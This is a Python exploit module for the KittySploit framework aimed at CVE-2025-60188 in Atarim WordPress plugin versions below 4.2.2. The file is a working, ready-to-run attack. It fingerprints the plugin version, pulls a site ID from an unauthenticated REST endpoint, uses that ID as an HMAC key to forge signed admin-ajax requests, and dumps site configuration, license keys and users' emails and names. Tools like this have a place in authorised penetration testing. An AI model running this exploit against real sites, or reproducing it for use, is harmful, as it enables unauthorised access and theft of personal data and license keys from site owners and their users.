import hashlib
import hmac
import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress Atarim Plugin < 4.2.2 - Sensitive Information Exposure",
        "description": (
            "CVE-2025-60188: Atarim WordPress plugin versions below 4.2.2 expose a site ID via "
            "an unauthenticated REST endpoint. That value is used as an HMAC key to forge signed "
            "admin-ajax requests and dump site configuration, license keys, and user PII."
        ),
        "author": ["Mohammad Hossein Sadeghian", "KittySploit Team"],
        "cve": "CVE-2025-60188",
        "references": [
            "https://wordpress.org/plugins/atarim/",
            "https://atarim.io/",
            "https://www.cve.org/CVERecord?id=CVE-2025-60188",
        ],
        "tags": ["wordpress", "atarim", "disclosure", "unauthenticated", "cve-2025-60188"],
    }

    _AFFECTED_VERSION = (4, 2, 2)
    _REQUEST_REFERENCE = "sys_admin_check"

    dump_config = OptBool(True, "Dump site configuration and license key", required=False)
    dump_users = OptBool(True, "Dump registered Atarim users (PII)", required=False)
    max_users = OptInteger(50, "Maximum number of users to display", required=False, advanced=True)

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.path)

    def _rest_vc_path(self) -> str:
        return f"{self._wp_base()}/wp-json/atarim/v1/db/vc"

    def _admin_ajax_path(self) -> str:
        return f"{self._wp_base()}/wp-admin/admin-ajax.php"

    def _plugin_readme_path(self) -> str:
        return self.wp_plugin_path(self._wp_base(), "atarim", "readme.txt")

    def _is_vulnerable_version(self, version: str) -> bool:
        try:
            return self.wp_version_to_tuple(version) < self._AFFECTED_VERSION
        except Exception:
            return False

    def _extract_site_id(self, text: str):
        match = re.search(r'"wpf_site_id":"(\d+)"', text or "")
        return match.group(1) if match else None

    def _fetch_site_id(self):
        response = self.http_request(
            method="GET",
            path=self._rest_vc_path(),
            allow_redirects=True,
            timeout=15,
        )
        if not response or response.status_code != 200:
            return None
        return self._extract_site_id(response.text or "")

    def _sign_headers(self, site_id: str) -> dict:
        signature = hmac.new(
            key=site_id.encode("utf-8"),
            msg=self._REQUEST_REFERENCE.encode("utf-8"),
            digestmod=hashlib.sha256,
        ).hexdigest()
        return {
            "Request-Reference": self._REQUEST_REFERENCE,
            "Request-Signature": signature,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
        }

    def _signed_ajax(self, site_id: str, action: str):
        response = self.http_request(
            method="POST",
            path=self._admin_ajax_path(),
            data={"action": action},
            headers=self._sign_headers(site_id),
            allow_redirects=False,
            timeout=20,
        )
        if not response or response.status_code != 200:
            return None
        try:
            return response.json()
        except Exception:
            try:
                return json.loads(response.text or "")
            except Exception:
                return None

    def check(self):
        try:
            response = self.http_request(
                method="GET",
                path=self._plugin_readme_path(),
                allow_redirects=True,
                timeout=10,
            )
        except Exception as exc:
            return {"vulnerable": False, "reason": f"Readme request failed: {exc}", "confidence": "low"}

        version = None
        if response and response.status_code == 200:
            version = self.wp_extract_version_from_readme(response.text or "")
            if version and not self._is_vulnerable_version(version):
                return {
                    "vulnerable": False,
                    "reason": f"Atarim version {version} appears patched (>= 4.2.2)",
                    "confidence": "high",
                }

        site_id = self._fetch_site_id()
        if not site_id:
            if version:
                return {
                    "vulnerable": False,
                    "reason": f"Atarim {version} detected but site ID endpoint did not leak an ID",
                    "confidence": "medium",
                }
            return {
                "vulnerable": False,
                "reason": "Atarim plugin not detected or site ID not exposed",
                "confidence": "low",
            }

        reason = f"Leaked site ID {site_id} via unauthenticated REST endpoint"
        if version:
            reason = f"Atarim {version}: {reason}"
        return {"vulnerable": True, "reason": reason, "confidence": "high", "site_id": site_id}

    def _print_config(self, site_id: str) -> bool:
        details = self._signed_ajax(site_id, "wpf_website_details")
        if not isinstance(details, dict):
            print_error("Failed to dump site configuration")
            return False

        rows = [
            ["URL", str(details.get("url", "N/A"))],
            ["Site Name", str(details.get("name", "N/A"))],
        ]

        license_key = details.get("wpf_license_key")
        if license_key and str(license_key).lower() != "false":
            rows.append(["License Key", str(license_key)])
        else:
            rows.append(["License Key", "Not found / free version"])

        settings = details.get("settings") or []
        for entry in settings:
            if not isinstance(entry, dict):
                continue
            name = str(entry.get("name", "")).replace("wpf_", "").replace("_", " ").title()
            rows.append([name or "setting", str(entry.get("value", ""))])

        print_success("Site configuration extracted")
        print_table(["Field", "Value"], rows)
        return True

    def _print_users(self, site_id: str) -> bool:
        users = self._signed_ajax(site_id, "wpf_website_users")
        if not isinstance(users, list) or not users:
            print_error("Failed to dump user records")
            return False

        limit = max(1, int(self.max_users or 50))
        rows = []
        for user in users[:limit]:
            if not isinstance(user, dict):
                continue
            rows.append([
                str(user.get("wpf_id", "-")),
                str(user.get("role", "none")),
                str(user.get("wpf_name", "unknown")),
                str(user.get("wpf_email", "unknown")),
                str(user.get("first_name", "")),
                str(user.get("last_name", "")),
            ])

        if not rows:
            print_error("No user rows parsed from response")
            return False

        print_success(f"Extracted {len(users)} user record(s)")
        print_table(
            ["ID", "Role", "Username", "Email", "First Name", "Last Name"],
            rows,
        )
        if len(users) > limit:
            print_info(f"Showing first {limit} of {len(users)} users (raise MAX_USERS to see more)")
        return True

    def run(self):
        print_status("Checking Atarim plugin exposure...")
        check_result = self.check()
        if not check_result.get("vulnerable"):
            print_error(check_result.get("reason", "Target does not appear vulnerable"))
            return False

        print_success(check_result["reason"])
        site_id = check_result.get("site_id") or self._fetch_site_id()
        if not site_id:
            print_error("Could not recover Atarim site ID")
            return False

        print_info(f"Using site ID: {site_id}")
        success = False

        if self.dump_config:
            print_status("Dumping site configuration...")
            success = self._print_config(site_id) or success

        if self.dump_users:
            print_status("Dumping user records...")
            success = self._print_users(site_id) or success

        if not self.dump_config and not self.dump_users:
            print_warning("Both DUMP_CONFIG and DUMP_USERS are disabled; nothing to extract")
            return True

        return success
